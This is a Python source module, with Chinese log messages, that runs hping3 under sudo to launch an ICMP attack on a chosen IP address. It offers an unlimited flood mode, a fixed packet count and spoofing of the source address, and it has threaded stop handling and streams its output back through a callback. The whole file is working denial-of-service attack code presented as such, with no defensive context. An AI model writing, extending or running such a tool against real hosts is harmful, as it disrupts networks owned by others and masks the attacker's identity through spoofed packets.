import subprocess
import time
import threading

def attack(target_ip, packet_count, callback, spoof_ip=None, stop_event=None):
    callback(f"[hping3] 發動 ICMP 攻擊至 {target_ip}，模式：{'Flood' if packet_count == -1 else f'{packet_count} 封包'}")

    cmd = ["sudo", "hping3", target_ip, "--icmp"]
    if spoof_ip:
        cmd += ["-a", spoof_ip]
    
    if packet_count == -1:
        cmd += ["--flood"]
    else:
        cmd += ["-c", str(packet_count)]

    callback(f"[hping3] 執行指令：{' '.join(cmd)}")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Create a thread to monitor stop_event
        def monitor_stop():
            while not (stop_event and stop_event.is_set()):
                if proc.poll() is not None:  # Process has ended
                    break
                time.sleep(0.1)
            if stop_event and stop_event.is_set():
                callback("[hping3] 收到停止請求，正在終止攻擊...")
                try:
                    proc.terminate()  # Try graceful termination
                    proc.wait(timeout=2)  # Wait for process to terminate
                except subprocess.TimeoutExpired:
                    callback("[hping3] 攻擊未正常終止，強制終止...")
                    proc.kill()  # Force kill if terminate fails
                    proc.wait()

        stop_monitor = threading.Thread(target=monitor_stop, daemon=True)
        stop_monitor.start()

        # Read output while process is running
        for line in proc.stdout:
            callback(f"[hping3] {line.strip()}")
            if stop_event and stop_event.is_set():
                break

        # Ensure process is terminated
        stop_monitor.join()
        if proc.poll() is None:  # If process is still running
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        callback(f"[hping3] 攻擊結束，返回碼：{proc.returncode}")
        return proc.returncode == 0
    except Exception as e:
        callback(f"[hping3] 錯誤：{e}")
        return False